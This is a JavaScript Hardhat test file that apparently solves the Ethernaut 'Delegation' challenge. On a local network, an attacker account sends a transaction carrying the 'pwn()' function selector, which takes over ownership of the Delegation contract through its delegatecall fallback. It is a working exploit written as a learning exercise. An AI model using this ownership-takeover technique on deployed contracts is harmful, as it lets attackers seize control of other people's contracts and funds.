const { ethers, getNamedAccounts, deployments } = require("hardhat")
const { deploy, log } = deployments
const { assert } = require("chai")


function ethereumFunctionSelector(functionSignature){
    const functionSignatureAsUtf8Bytes = ethers.utils.toUtf8Bytes(functionSignature)
    const signatureCksum = ethers.utils.keccak256(functionSignatureAsUtf8Bytes)
    // end is 10 because we want the first four bytes (8 characters), and
    // signatureCksum starts with 0x (two characters).  arrayify expects
    // what ethers calls a DataHexStringOrArrayish https://docs.ethers.org/v5/api/utils/bytes/
    // which is something like 0xdd365b8b
    const firstFourBytesOfChecksum = signatureCksum.slice(0, 10)
    return firstFourBytesOfChecksum
  }

describe("Delegate Test", () => {
    let delegate, delegation, attacker, deployer
    beforeEach(async () => {
        deployer = (await getNamedAccounts()).deployer
        const accounts = await ethers.getSigners()
        attacker = accounts[1]

        const deployDelegate = await deploy("Delegate", {
            from: deployer,
            args: [deployer],
            log: true,
        })
        const deployDelegation = await deploy("Delegation", {
            from: deployer,
            args: [deployDelegate.address],
            log: true,
        })
        delegate = await ethers.getContract("Delegate", deployer)
        delegation = await ethers.getContract("Delegation", deployer)
    })

    describe("Check the owner of delegate and delegation", () => {
        it("check owner", async () => {
            const ownerDelegate = (await delegate.owner()).toString()
            const ownerDelegation = (await delegation.owner()).toString()
            assert.equal(ownerDelegate, deployer)
            assert.equal(ownerDelegation, deployer)
        })
        it("Lest hackkkee this >>>Hacker hai hacker", async () => {
            const hackerConnected = await ethers.getContract(
                "Delegation",
                attacker
            )
            const data = ethereumFunctionSelector("pwn()")
            // Encode the function call
            const tx = await attacker.sendTransaction({
                from: attacker.address,
                to: delegation.address,
                data: data,
                value: 0,
                gasLimit: 2000000
            })
            await tx.wait(1)
            const newOwner = await delegation.owner()
            console.log(`The data is ${data}`)
            console.log(`The  deployer address ${deployer}`)
            console.log(attacker.address)
            assert.equal(newOwner.toString(), attacker.address)
        })
    })
})
